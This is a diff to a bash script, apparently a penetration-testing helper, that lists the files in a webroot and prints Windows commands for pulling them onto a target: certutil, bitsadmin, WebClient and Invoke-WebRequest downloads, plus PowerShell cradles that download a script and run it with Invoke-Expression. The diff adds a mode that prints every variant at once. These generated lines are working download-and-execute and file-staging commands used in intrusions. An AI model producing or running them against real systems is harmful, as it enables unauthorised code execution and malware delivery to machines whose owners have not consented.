@@ -11,10 +11,11 @@ PORT=80
 USER_IP=""              # OR HOSTNAME
 WEBROOT="/var/www/html"
 
+ALL_MODE=false
 BITSADMIN_MODE=false
 CERTUTIL_MODE=false
 CRADLE_MODE=false 
-PRINT_BANNER=true
+SILENT=false
 WEBCLIENT_MODE=false
 
 ####################
@@ -49,6 +50,7 @@ EOF
 print_usage() {
     echo "Usage: $0 [options]"
     echo "Options:"
+    echo "  -a, --all              Print all commands"
     echo "  -b, --bitsadmin        Use bitsadmin for file transfers"
     echo "  -c, --cradle           Use cradle mode for PowerShell (iwr or webclient)"
     echo "  -cu, --certutil        Use certutil for file transfers"
@@ -86,16 +88,17 @@ retrieve_ip() {
 # Parse command-line arguments
 while [ "$#" -gt 0 ]; do
     case $1 in
-        -b|--bitsadmin) BITSADMIN_MODE=true; shift ;;
-        -c|--cradle) CRADLE_MODE=true; shift ;;         # Supported by iwr (default), webclient
-        -cu|--certutil) CERTUTIL_MODE=true; shift ;;
+        -a|--all) ALL_MODE=true;;
+        -b|--bitsadmin) BITSADMIN_MODE=true;;
+        -c|--cradle) CRADLE_MODE=true;;
+        -cu|--certutil) CERTUTIL_MODE=true;;
         -h|--help) print_usage; exit 0 ;;
         -i|--ip) USER_IP="$2"; shift ;;
         -n|--network) NETWORK_INTERFACE="$2"; shift ;;
         -p|--port) PORT="$2"; shift ;;
-        -s|--silent) PRINT_BANNER=false; shift ;;
+        -s|--silent) SILENT=true;;
         -w|--webroot) WEBROOT="$2"; shift ;;
-        -wc|--webclient) WEBCLIENT_MODE=true; shift ;;
+        -wc|--webclient) WEBCLIENT_MODE=true;;
         *) echo "Unknown parameter passed: $1"; print_usage; exit 1 ;;
     esac
     shift
@@ -114,7 +117,7 @@ if [ -z $USER_IP ]; then
 fi
 
 # print banner
-if [ "$PRINT_BANNER" = true ]; then 
+if [ "$SILENT" = false ]; then 
     print_banner
     echo \n
 fi
@@ -139,38 +142,55 @@ while IFS= read -r -d '' FILE; do
     # Extract only the file name for the -OutFile parameter
     FILE_NAME=$(basename "$FILE")
 
-    # Cradle Mode
-    if [ "$CRADLE_MODE" = true ]; then
-        # WEBCLIENT
-        if [ "$WEBCLIENT_MODE" = true ]; then
-            echo "Invoke-Expression(New-Object Net.Webclient).downloadstring(\"${BASE_URL}${URL_PATH}\")"
-        # IWR
-        else
-            echo "Invoke-Expression(Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -UseBasicParsing)"
-        fi
-    # CERTUTIL
-    elif [ "$CERTUTIL_MODE" = true ]; then
+    if [ "$ALL_MODE" = true ]; then 
+
+        # CERTUTIL
         echo "certutil -urlcache -f ${BASE_URL}${URL_PATH} ${FILE_NAME}"
-    # BITSADMIN
-    elif [ "$BITSADMIN_MODE" = true ]; then
+        # BITSADMIN
         echo "bitsadmin /create 1 bitsadmin /addfile 1 ${BASE_URL}${URL_PATH} c:\\Windows\\Tasks\\${FILE_NAME} bitsadmin /RESUME 1 bitsadmin /complete 1"
-    # WEBCLIENT
-    elif [ "$WEBCLIENT_MODE" = true ]; then
+        # WEBCLIENT
         # Cradle Mode
-        if [ "$CRADLE_MODE" = true ]; then
-                echo "Invoke-Expression(New-Object Net.Webclient).downloadstring(\"${BASE_URL}${URL_PATH}\")"
+        echo "Invoke-Expression(New-Object Net.Webclient).downloadstring(\"${BASE_URL}${URL_PATH}\")"
+        # Net.Webclient
+        echo "(New-Object System.Net.WebClient).DownloadFile(\"${BASE_URL}${URL_PATH}\", \"${FILE_NAME}\")"
+        # IWR (default)
+        # Cradle Mode
+        echo "Invoke-Expression(Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -UseBasicParsing)"
+        # IWR
+        echo "Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -OutFile .\\${FILE_NAME}"
+   
+    else
+
+        # CERTUTIL
+        if [ "$CERTUTIL_MODE" = true ]; then
+            echo "certutil -urlcache -f ${BASE_URL}${URL_PATH} ${FILE_NAME}"
+        # BITSADMIN
+        elif [ "$BITSADMIN_MODE" = true ]; then
+            echo "bitsadmin /create 1 bitsadmin /addfile 1 ${BASE_URL}${URL_PATH} c:\\Windows\\Tasks\\${FILE_NAME} bitsadmin /RESUME 1 bitsadmin /complete 1"
+        # WEBCLIENT
+        elif [ "$WEBCLIENT_MODE" = true ]; then
+            # Cradle Mode
+            if [ "$CRADLE_MODE" = true ]; then
+                    echo "Invoke-Expression(New-Object Net.Webclient).downloadstring(\"${BASE_URL}${URL_PATH}\")"
+                else
+                    echo "(New-Object System.Net.WebClient).DownloadFile(\"${BASE_URL}${URL_PATH}\", \"${FILE_NAME}\")"
+            fi
+        # IWR (default)
+        else 
+            # Cradle Mode
+            if [ "$CRADLE_MODE" = true ]; then
+                echo "Invoke-Expression(Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -UseBasicParsing)"
+                # IWR
             else
-                echo "(New-Object System.Net.WebClient).DownloadFile(\"${BASE_URL}${URL_PATH}\", \"${FILE_NAME}\")"
-        fi
-    # IWR (default)
-    else 
-        # Cradle Mode
-        if [ "$CRADLE_MODE" = true ]; then
-            echo "Invoke-Expression(Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -UseBasicParsing)"
-            # IWR
-        else
-            echo "Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -OutFile .\\${FILE_NAME}"
+                echo "Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -OutFile .\\${FILE_NAME}"
+            fi
         fi
     fi
+
 done < <(find "$WEBROOT" -type f -print0)
 ) | sort 
+
+# TO-DO
+# Linux support
+# All mode
+# More lolbins
